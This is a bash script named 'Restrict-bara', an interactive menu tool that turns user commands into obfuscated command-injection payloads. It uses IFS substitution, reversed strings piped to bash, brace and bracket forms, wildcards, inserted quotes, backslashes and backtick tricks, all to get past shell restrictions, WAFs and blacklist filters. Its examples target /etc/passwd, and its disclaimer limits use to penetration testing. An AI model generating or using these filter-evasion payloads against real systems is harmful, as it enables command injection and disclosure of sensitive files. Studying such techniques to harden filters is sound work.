#!/bin/bash

# ANSI escape codes for colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠛⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣄⣼⡦⠴⠒⠒⠶⣤⣀⠀⣾⢧⡋⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⡤⠶⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⣋⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀Restrict-bara⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣶⣦⠈⠻⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⡠⠞⠃⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⡀⠙⣇⠀⠀⠀Bypass Linux Restrictions⠀⠀
⡞⠁⠀⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠟⠀⠀⠙⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀script
⡿⣤⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠳⣄⠀⠀⡀⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⡀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀credits: book.hacktricks.xy⠀⠀⠀⠀⠀⠀
⠘⣇⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⢀⣴⠞⠀⠹⠆⠀⠀⠈⢳⠀⠀⠀⠀⠀⠁⠀⠀⠀⠉⠳⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⢦⣤⣹⣄⣀⣀⣠⣤⠴⠊⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠲⣤⡀⠀⠀⠀⠀⠈⠙⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠲⢤⡀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢰⡄⠀⠀⠀⠀⠁⠀⠀⠀⠀⠈⠑⠢⣄⡙⠷⣄⠀⠀⠀⠀⠀⠀⠀⠀by 5yn7hp0w3r
⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⡀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⠀⠀⢳⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠑⢄⠙⢆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⠂⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⢀⣤⠴⠚⠃⠀⠀⠘⢢⡀⠀⠀⠉⠀⠀⠈⠧⠘⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡇⠀⠀⠀⠀⠀⠀⠀⠘⠋⠀⠀⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⢦⠀⠀⠀⠀⠈⣇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⠀⢰⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠈⢳⡀⠀⠀⠀⠸⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠘⠷⠀⠀⠀⠀⠀⢠⠀⠀⠀⠠⡏⠀⠀⢠⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⡀⠀⠀⠷⠀⢸⡄⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⡄⠀⠀⢸⡇⠀⠀⢸⣧⠀⠀⠈⢣⠀⠀⠀⠀⢀⣳⠀⠀⠀⢹⡄⠀⠀⠀⠈⠁⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⣷⠀⠀⠘⠃⠀⠀⢀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠸⢳⡀⢀⡀⠀⢠⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⢻⡇⠀⠀⠀⠀⠀⣸⠉⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠐⣧⠀⠸⠀⡼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣦⡀⣸⣷⠀⠀⠀⠀⠀⡇⠀⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⢸⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣖⡿⣿⡟⣻⣿⣷⡄⠀⠀⢾⣁⡀⠀⠀⣨⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠷⠿⣿⣥⠟⠀⣹⣾⠦⡿⡾⠇⠉⢻⣟⣀⣀⡬⠟⠲⢤⣀⣀⣀⠀⠀⠀⠀⢀⣀⡴⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠁⢰⣿⡽⢛⡤⢠⡇⠀⠀⠀⠉⠉⠙⠓⠒⠒⠚⠉⠁⠀⠉⠑⠒⠒⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠒⣿⣤⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"

	echo " "
	echo -e "${YELLOW}Help menu:${NC}"
	echo "Type: restrictbara.sh -h or --help"
	echo "Show this help message and exit"
	echo " "
	echo -e "${YELLOW}Disclaimer:${NC}"
	echo " "
	echo -e "${RED}The author assumes no responsibility for any damage caused by this tool. Its primary purpose is to consolidate a variety of bypass methods into a single, convenient utility.${NC}"
	echo " "
	echo -e "${RED}Please, only use it for legitimate purposes such as penetration testing or for educational purposes.${NC}"
	

function print_help() {
    echo -e "Script Description: This script automates the process of bypassing Linux terminal restrictions, allowing you to circumvent certain blacklist filters. It is important to combine methods to achieve the best results."
    echo -e "Available options:"
    echo -e "  ${GREEN}1. Bypass IFS${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass IFS' method allows bypassing the standard input field separators (IFS), which include spaces, tabs, and newlines. This is useful when you need to work with commands or inputs containing spaces."
    echo -e "     ${YELLOW}Usage examples:${NC} It can be used with commands containing spaces or tabs, such as 'ls -la' or 'cat /etc/passwd'."
    echo -e "     ${YELLOW}Example:${NC} To bypass spaces, you can use a construct like 'ls -la' as 'ls\${IFS}-la'."
    echo ""
    echo -e "  ${GREEN}2. Bypass Reverse${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass Reverse' method allows you to reverse the input string and execute it in reverse order. This can be useful in scenarios where command processing is required in reverse order. (Bypass WAF, Blacklisting)"
    echo -e "     ${YELLOW}Usage examples:${NC} Suitable for commands like 'whoami' or 'cat /etc/passwd', which will be executed in reverse."
    echo -e "     ${YELLOW}Example:${NC} '(rev<<<'imaohw')|bash' will execute the command in reverse order."
    echo ""
    echo -e "  ${GREEN}3. Bypass {form}${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass {form}' method allows processing commands containing curly braces. This method is suitable for commands that may be in such a format."
    echo -e "     ${YELLOW}Usage examples:${NC} Use commands, such as 'cat /etc/passwd', for checking or execution."
    echo -e "     ${YELLOW}Example:${NC} The command 'cat /etc/passwd' will be processed in curly brace format. '{cat,/etc/passwd}'"
    echo ""
    echo -e "  ${GREEN}4. Bypass []${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass []' method allows processing commands containing square brackets. This method can be useful for handling commands that include square brackets."
    echo -e "     ${YELLOW}Usage examples:${NC} Enter only multiple commands, such as 'cat /etc/passwd', which will be processed with square brackets."
    echo -e "     ${YELLOW}Example:${NC} The command 'cat /etc/passwd' will be processed in square bracket format. 'cat /e[t]c/p[a]s[s]w[d]' (Bypass WAF, Blacklisting)"
    echo ""
    echo -e "  ${GREEN}5. Bypass Quotes${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass Quotes' method allows processing commands containing various quote bypass methods. This method is useful when commands contain quotes or other characters that require special handling."
    echo -e "     ${YELLOW}Usage examples:${NC} Enter single commands, such as 'whoami', to test various quote bypass methods."
    echo -e "     ${YELLOW}Example:${NC} The command 'whoami' will be processed using various quote bypass methods. (Bypass WAF, Blacklisting)"
    echo ""
    echo -e "  ${GREEN}6. Bypass ? and *${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass ? and *' method allows replacement of specific characters in the command with '?' or '*'. This can be used to evade filters that do not recognize these characters."
    echo -e "     ${YELLOW}Usage examples:${NC} Commands like 'ls -la' can be transformed to 'ls ?la' or 'ls *la' or 'cat /et*/p*sswd' to bypass filters."
    echo -e "     ${YELLOW}Example:${NC} For input 'ls -la', outputs will be 'ls ?la' and 'ls *la'."
    echo ""
    echo -e "  ${GREEN}7. Bypass Backslashes${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass Backslashes' method replaces backslashes in the command with alternative representations. This can help bypass filters that specifically target backslashes."
    echo -e "     ${YELLOW}Usage examples:${NC} Commands containing backslashes like 'cat /etc/passwd' can be altered."
    echo -e "     ${YELLOW}Example:${NC} For input 'cat /etc/passwd', outputs might include"
	echo "                                                                  'cat \/\e\t\c\/\p\a\s\s\w\d'"
    echo ""
    echo -e "  ${GREEN}8. Bypass Fake Commands${NC}"
    echo -e "     ${YELLOW}Description:${NC} The 'Bypass Fake Commands' method involves creating fake commands or altering command names to avoid detection."
    echo -e "     ${YELLOW}Usage examples:${NC} Commands like 'whoami' can be transformed into"
	echo w\`u\`h\`u\`o\`u\`a\`u\`m\`u\`i\`u\`
	echo " example output:
	u: command not found
	u: command not found
	u: command not found
	u: command not found
	u: command not found
	u: command not found
	ubuntu"

    echo ""
    echo -e "${GREEN}9. Exit${NC}"
    echo -e "${YELLOW}Description:${NC} Exit the script."
	echo " "
	echo -e "${YELLOW}Disclaimer:${NC}"
	echo " "
	echo -e "${RED}The author assumes no responsibility for any damage caused by this tool. Its primary purpose is to consolidate a variety of bypass methods into a single, convenient utility.${NC}"
	echo " "
	echo -e "${RED}Please, only use it for legitimate purposes such as penetration testing or for educational purposes.${NC}"
    echo ""
}

function bypass_ifs() {
    echo "Bypass IFS"
    read -p "Enter payload: " user_input
    new_input=$(echo "$user_input" | sed 's/ /${IFS}/g')
    
    echo -e "${GREEN}Generated payload:${NC}"
    echo "$new_input"
}

function bypass_reverse() {
    echo "Bypass Reverse"
    echo "How to generate reverse command? Enter 'whoami' as an example."
    echo "Output: (rev<<<'imaohw')|bash"
    echo "How to bypass spaces?"
    echo "Enter command like: ls -la  - ls${IFS}-la"
    echo "Output: (rev<<<'al-}SFI{$sl')|bash"
    echo "Good Luck!"
    read -p "Enter payload: " input
    result=$(echo "(rev<<<'$(rev <<< "$input")')|bash")
    result2=$(echo "(rev<<<'$(rev <<< "$input")')|b'as'h")
    echo -e "${GREEN}Generated payload:${NC}"
    echo "$result"
    echo 'If the word "bash" is filtered:'
    echo "$result2"
}

function bypass_form() {
    echo "Bypass {form}"
    read -p "Enter payload: " user_input
    bypass_payload=$(echo "$user_input" | sed 's/^/{/; s/ /,/g; s/$/}/')
    
    echo -e "${GREEN}Generated payload:${NC}"
    echo "$bypass_payload"
}

function bypass_brackets() {
    echo "Bypass []"
    echo "Example: cat /etc/passwd"
    
    transform_command() {
        local cmd="$1"
        local result=""
        local length=${#cmd}

        for (( i=0; i<$length; i++ )); do
            char="${cmd:$i:1}"

            if [[ "$char" =~ [a-zA-Z] && $i -lt $((length-1)) ]]; then
                next_char="${cmd:$((i+1)):1}"

                if [[ "$next_char" != "/" ]]; then
                    result+="$char[$next_char]"
                    ((i++))
                else
                    result+="$char$next_char"
                    ((i++))
                fi
            else
                result+="$char"
            fi
        done

        echo "$result"
    }

    read -p "Enter payload: " user_input

    command_part="${user_input%% *}"
    params_part="${user_input#* }"

    if [ "$params_part" != "$user_input" ]; then
        transformed_params=$(transform_command "$params_part")
        transformed_command="$command_part $transformed_params"
    else
        transformed_command="$command_part"
    fi

    echo -e "${GREEN}Generated payload:${NC}"
    echo "$transformed_command"
}

function bypass_quotes() {
    echo " "
	echo " "
	echo -e "${GREEN}Use mostly single commands like 'whoami'${NC}"
	echo -e "${RED}But you can also use '/etc/passwd', but not all generated pailoads will work, be sure to test them before using them on a virtual machine${NC}"
    echo " "
    echo " "
    echo -e "character list:\n\n'\n''\n\"\n\"\"\n\$@\n|\$0\n\${u}"
    echo ""

    read -p "Enter payload: " user_input

    generate_bypass_paths() {
        local payload="$1"
        local paths=""

        paths+=$(echo "$payload" | sed -E "s/(.)/\1'/g; s/'(\w)'$/\1/")$'\n'
        paths+=$(echo "$payload" | sed "s/./&''/g")$'\n'
        paths+=$(echo "$payload" | sed "s/./&\"/g")$'\n'
        paths+=$(echo "$payload" | sed "s/./&\"\"/g")$'\n'

        paths+=$(echo "$payload" | sed "s/./&\$@/g")$'\n'
        paths+=$(echo "$payload" | sed "s/./&|\$0/g")$'\n'
        paths+=$(echo "$payload" | sed "s/./&\${u}/g")$'\n'

        echo -e "$paths"
    }
    
    > bypass_path.txt
    bypass_paths=$(generate_bypass_paths "$user_input")

    echo -e "${GREEN}Generated payload:${NC}"
    echo -e "$bypass_paths" > bypass_paths.txt

    sed -E 's/(['\''""$@])['\''""$@]$/\1/' bypass_paths.txt | sed 's/['\''""$@]$//' > bypass_path.txt
    sed -i '3s/$/"/' bypass_path.txt

    cat bypass_path.txt
    rm bypass_paths.txt && rm bypass_path.txt
}

function bypass_question_asterisk() {
    echo "Bypass ? and *"
    read -p "Enter payload: " payload

    first_word=$(echo "$payload" | cut -d' ' -f1)
    second_word=$(echo "$payload" | cut -d' ' -f2-)

    length=${#second_word}
    random_index=$(( RANDOM % length ))

    new_second_word_question="${second_word:0:random_index}?${second_word:random_index+1}"
    new_second_word_asterisk="${second_word:0:random_index}*${second_word:random_index+1}"

    new_payload_question="$first_word $new_second_word_question"
    new_payload_asterisk="$first_word $new_second_word_asterisk"

    echo -e "${GREEN}Payload with replaced by ?:${NC} $new_payload_question"
    echo -e "${GREEN}Payload with replaced by *:${NC} $new_payload_asterisk"
}

function bypass_backslashes() {
# User input 
	read -p "Enter payload: " payload

# Cut first and second word
	first_word=$(echo "$payload" | cut -d' ' -f1)
	second_word=$(echo "$payload" | cut -d' ' -f2-)

# We escape all characters, including even slashes
# We use double escaping to display slashes correctly
	escaped_payload=$(echo "$second_word" | sed 's/./\\&/g' | sed 's/\\\\/\\/g')

# We display the result
	echo -e "${GREEN}Generated payload:${NC}"
	echo "${first_word} ${escaped_payload}"
	echo " "
}

function bypass_fake_commands() {
    echo "Bypass Fake Commands"
    read -p "Enter payload: " payload

    generate_fake_command() {
        local command="$1"
        local fake_command=""

        for (( i=0; i<${#command}; i++ )); do
            local char="${command:$i:1}"

            if [[ "$char" != " " ]]; then
                fake_command+="$char\`u\`"
            else
                fake_command+=" "
            fi
        done

        echo "$fake_command"
    }

    fake_command=$(generate_fake_command "$payload")

    echo -e "${GREEN}Original command:${NC} $payload"
    echo -e "${GREEN}Fake command:${NC} $fake_command"
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    print_help
    exit 0
fi

while true; do
    echo "Menu:"
    echo "1. Bypass IFS"
    echo "2. Bypass Reverse"
    echo "3. Bypass {form}"
    echo "4. Bypass []"
    echo "5. Bypass Quotes"
    echo "6. Bypass ? and *"
    echo "7. Bypass Backslashes"
    echo "8. Bypass Fake Commands"
    echo "9. Exit"
    read -p "Enter option number: " option
    
    case $option in
        1) bypass_ifs ;;
        2) bypass_reverse ;;
        3) bypass_form ;;
        4) bypass_brackets ;;
        5) bypass_quotes ;;
        6) bypass_question_asterisk ;;
        7) bypass_backslashes ;;
        8) bypass_fake_commands ;;
        9) exit ;;
        *) echo "Invalid option, format again" ;;
    esac
done
